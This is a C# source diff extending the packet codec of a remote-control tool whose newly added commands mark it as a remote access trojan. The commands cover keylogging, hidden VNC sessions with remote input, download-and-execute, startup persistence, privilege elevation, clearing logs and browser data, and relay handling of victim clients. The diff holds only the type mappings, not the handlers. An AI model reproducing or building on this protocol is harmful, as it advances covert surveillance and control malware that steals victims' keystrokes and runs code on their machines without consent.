@@ -81,6 +81,54 @@ namespace RemoteControl.Protocals.Codec
             mappings.Add(ePacketType.PACKET_AUTORUN_RESPONSE, typeof(ResponseAutoRun));
             mappings.Add(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, typeof(ResponseStartDownload));
 
+            // 新增功能映射
+            mappings.Add(ePacketType.PACKET_CLEAR_LOG_REQUEST, typeof(RequestClearLog));
+            mappings.Add(ePacketType.PACKET_CLEAR_LOG_RESPONSE, typeof(ResponseClearLog));
+            mappings.Add(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, typeof(RequestClearBrowserData));
+            mappings.Add(ePacketType.PACKET_CLEAR_BROWSER_DATA_RESPONSE, typeof(ResponseClearBrowserData));
+            mappings.Add(ePacketType.PACKET_RUN_FILE_REQUEST, typeof(RequestRunFile));
+            mappings.Add(ePacketType.PACKET_RUN_FILE_RESPONSE, typeof(ResponseRunFile));
+            mappings.Add(ePacketType.PACKET_COMPRESS_FILE_REQUEST, typeof(RequestCompressFile));
+            mappings.Add(ePacketType.PACKET_COMPRESS_FILE_RESPONSE, typeof(ResponseCompressFile));
+            mappings.Add(ePacketType.PACKET_DECOMPRESS_FILE_REQUEST, typeof(RequestDecompressFile));
+            mappings.Add(ePacketType.PACKET_DECOMPRESS_FILE_RESPONSE, typeof(ResponseDecompressFile));
+            mappings.Add(ePacketType.PACKET_WRITE_STARTUP_REQUEST, typeof(RequestWriteStartup));
+            mappings.Add(ePacketType.PACKET_WRITE_STARTUP_RESPONSE, typeof(ResponseWriteStartup));
+            mappings.Add(ePacketType.PACKET_RESTART_EXPLORER_REQUEST, typeof(RequestRestartExplorer));
+            mappings.Add(ePacketType.PACKET_ELEVATE_PRIVILEGE_REQUEST, typeof(RequestElevatePrivilege));
+            mappings.Add(ePacketType.PACKET_TOGGLE_PROXY_REQUEST, typeof(RequestToggleProxy));
+            mappings.Add(ePacketType.PACKET_PROXY_MAPPING_REQUEST, typeof(RequestProxyMapping));
+            mappings.Add(ePacketType.PACKET_KEYLOGGER_START_REQUEST, typeof(RequestKeylogger));
+            mappings.Add(ePacketType.PACKET_KEYLOGGER_STOP_REQUEST, typeof(RequestKeylogger));
+            mappings.Add(ePacketType.PACKET_KEYLOGGER_RESPONSE, typeof(ResponseKeylogger));
+            mappings.Add(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, typeof(RequestServiceManager));
+            mappings.Add(ePacketType.PACKET_SERVICE_MANAGER_RESPONSE, typeof(ResponseServiceManager));
+            mappings.Add(ePacketType.PACKET_DOWNLOAD_EXEC_REQUEST, typeof(RequestDownloadExec));
+            mappings.Add(ePacketType.PACKET_DOWNLOAD_EXEC_RESPONSE, typeof(ResponseDownloadExec));
+            mappings.Add(ePacketType.PACKET_UNINSTALL_REQUEST, typeof(RequestUninstall));
+            mappings.Add(ePacketType.PACKET_GET_DRIVES_EX_RESPONSE, typeof(ResponseGetDrivesEx));
+            mappings.Add(ePacketType.PACKET_REMOTE_CHAT_REQUEST, typeof(RequestRemoteChat));
+            mappings.Add(ePacketType.PACKET_REMOTE_CHAT_RESPONSE, typeof(ResponseRemoteChat));
+            mappings.Add(ePacketType.PACKET_FIND_WINDOW_REQUEST, typeof(RequestFindWindow));
+            mappings.Add(ePacketType.PACKET_FIND_WINDOW_RESPONSE, typeof(ResponseFindWindow));
+            mappings.Add(ePacketType.PACKET_CHANGE_CONFIG_REQUEST, typeof(RequestChangeConfig));
+            mappings.Add(ePacketType.PACKET_CHANGE_CONFIG_RESPONSE, typeof(ResponseChangeConfig));
+            mappings.Add(ePacketType.PACKET_CHANGE_RESOLUTION_REQUEST, typeof(RequestChangeResolution));
+            mappings.Add(ePacketType.PACKET_CHANGE_RESOLUTION_RESPONSE, typeof(ResponseChangeResolution));
+            mappings.Add(ePacketType.PACKET_HVNC_START_REQUEST, typeof(RequestHVNCStart));
+            mappings.Add(ePacketType.PACKET_HVNC_START_RESPONSE, typeof(ResponseHVNCStart));
+            mappings.Add(ePacketType.PACKET_HVNC_SCREEN_RESPONSE, typeof(ResponseHVNCScreen));
+            mappings.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, typeof(RequestMouseEvent));
+            mappings.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, typeof(RequestKeyboardEvent));
+            mappings.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, typeof(RequestHVNCRunProcess));
+
+            // Relay 中转协议映射
+            mappings.Add(ePacketType.CYCLER_RELAY_HANDSHAKE, typeof(Relay.RelayHandshake));
+            mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_LIST_RESPONSE, typeof(Relay.RelayClientListResponse));
+            mappings.Add(ePacketType.CYCLER_RELAY_SELECT_CLIENT, typeof(Relay.RelaySelectClient));
+            mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_ONLINE, typeof(Relay.RelayClientOnline));
+            mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_OFFLINE, typeof(Relay.RelayClientOffline));
+
             return mappings;
         }
     }
